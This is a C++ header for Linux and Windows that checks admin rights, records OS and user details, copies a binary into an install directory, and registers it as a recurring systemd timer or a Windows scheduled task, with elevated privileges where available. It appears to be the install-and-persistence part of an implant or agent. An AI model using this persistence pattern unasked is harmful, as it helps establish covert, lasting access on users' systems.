#ifndef SYSTEM_HH
#define SYSTEM_HH

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <string>

#include "constants.hh"
#include "request.hh"

#ifdef __linux__

#include <sys/stat.h>
#include <unistd.h>

namespace util {

bool copyFile(std::string src, std::string dst) {
    std::ifstream srcFile(src, std::ios::binary);
    std::ofstream dstFile(dst, std::ios::binary | std::ios::trunc);
    if (srcFile.is_open() && dstFile.is_open()) {
        dstFile << srcFile.rdbuf();
        return true;
    } else
        return false;
}

int linkFile(std::string src, std::string dst) {
    return link(src.c_str(), dst.c_str());
}

std::string popenSubprocess(const std::string& cmd) {
    FILE* pipe;
    char buf[512];
    std::string output;

    if (!(pipe = popen(cmd.c_str(), "r"))) {
        std::exit(1);
    }

    while (std::fgets(buf, sizeof(buf), pipe) != NULL) {
        output += buf;
    }
    pclose(pipe);

    return output;
}

bool isSuperuser() { return (popenSubprocess("id -u | tr -d '\n'") == "0"); }

std::string getInstallDir() {
    std::string installDir;
    if (isSuperuser()) {
        installDir = ROOT_HOME + "/" + INSTALL_DIR + "/";
    } else {
        installDir = std::getenv("HOME") + ("/" + INSTALL_DIR + "/");
    }

    return installDir;
}

std::string getOS() { return util::popenSubprocess("uname | tr -d '\n'"); }

std::string getUser() {
    std::string user;

    if (util::isSuperuser()) {
        user = "root";
    } else {
        user = std::getenv("USER");
    }

    return user;
}

}  // namespace util

namespace install {

void installFiles() {
    std::string mkdirCmd, installDir, timerPath, binPath;

    installDir = util::getInstallDir();
    binPath = installDir + BIN_NEW;
    mkdirCmd = "mkdir -p " + util::getInstallDir() + " ";

    if (util::isSuperuser()) {
        mkdirCmd += SYS_SERVICE_DEST;
        timerPath = SYS_SERVICE_DEST + "/" + TIMER;

        // Change service name back to normal after moving if root
        util::copyFile(SYS_SERVICE, SYS_SERVICE_DEST + "/" + SERVICE);
    } else {
        std::string homeDir = std::getenv("HOME");
        std::string userServiceDir = homeDir + "/" + SERVICE_DEST;

        mkdirCmd += userServiceDir;
        timerPath = userServiceDir + "/" + TIMER;

        util::copyFile(SERVICE, userServiceDir + "/" + SERVICE);
    }

    std::system(mkdirCmd.c_str());
    util::copyFile(BIN, binPath);
    util::copyFile(TIMER, timerPath);

    // Ensure that binary is executable for owner
    chmod(binPath.c_str(), S_IRWXU);
}

void initRecurringJob() {
    std::string systemdCmd;

    if (util::isSuperuser()) {
        systemdCmd = "systemctl enable --now " + TIMER;
    } else {
        systemdCmd = "systemctl enable --now --user " + TIMER;
    }

    std::system(systemdCmd.c_str());
}

}  // namespace install

#endif  // __linux__

#ifdef WIN32

#include <windows.h>
#include <regex>

bool IS_SUPERUSER;
bool IS_SUPERUSER_IS_CACHED = false;

namespace util {

bool copyFile(std::string src, std::string dst) {
    return CopyFile(src.c_str(), dst.c_str(), false);
}

std::string popenSubprocess(const std::string& cmd) {
    FILE* pipe;
    char buf[512];
    std::string output;

    if (!(pipe = _popen(cmd.c_str(), "r"))) {
        std::exit(1);
    }

    while (fgets(buf, sizeof(buf), pipe) != NULL) {
        output += buf;
    }
    _pclose(pipe);

    return output;
}

bool isSuperuser() {
    if (IS_SUPERUSER_IS_CACHED) {
        return IS_SUPERUSER;
    } else {
        IS_SUPERUSER = (util::popenSubprocess("net session")).size();
        IS_SUPERUSER_IS_CACHED = true;

        return IS_SUPERUSER;
    }
}

std::string getInstallDir() {
    std::string installDir;
    if (util::isSuperuser()) {
        installDir = ADMIN_INSTALL_DIR + "\\";
    } else {
        installDir = std::getenv("USERPROFILE") + ("\\" + INSTALL_DIR + "\\");
    }

    return installDir;
}

std::string getOS() {
    std::string winVersion =
        util::popenSubprocess("systeminfo | findstr /B /C:\"OS Name\"");
    std::regex pattern("[\\n\\r\\s]*.*?(Windows\\s*\\S+).*[\\n\\r\\s]*");
    std::smatch match;
    std::regex_match(winVersion, match, pattern);

    return match[1];
}

std::string getUser() {
    std::string user = std::getenv("USERNAME");
    if (isSuperuser()) {
        user += " (admin)";
    }

    return user;
}

}  // namespace util

namespace install {

void installFiles() {
    std::string installDir = util::getInstallDir();
    std::system(("mkdir " + installDir).c_str());
    util::copyFile(BIN, installDir + BIN_NEW);
}

void initRecurringJob() {
    // Schedule task for Windows
    std::string installDir = util::getInstallDir();
    std::string taskCommand = "schtasks.exe /create /F /tn " + TASK_NAME +
                              " /sc " + TASK_FREQ + " /mo " + TASK_FREQ_VALUE +
                              " /tr " + installDir + BIN_NEW;
    if (util::isSuperuser()) {
        taskCommand += " /rl highest";
    }

    std::system(taskCommand.c_str());
}

}  // namespace install

#endif  // WIN32

#endif  // SYSTEM_HH
